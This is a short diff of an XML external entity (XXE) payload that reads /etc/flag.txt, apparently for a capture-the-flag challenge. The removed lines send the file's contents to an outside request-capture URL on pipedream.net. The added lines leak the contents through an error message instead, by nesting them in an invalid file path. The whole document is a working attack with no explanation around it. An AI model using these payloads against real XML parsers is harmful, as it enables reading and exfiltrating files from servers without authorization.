@@ -1,3 +1,4 @@
 <!ENTITY % file SYSTEM "file:///etc/flag.txt">
-<!ENTITY % send SYSTEM "https://eotad3zugug90z.m.pipedream.net/submit?data=%file;">
-%send;
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
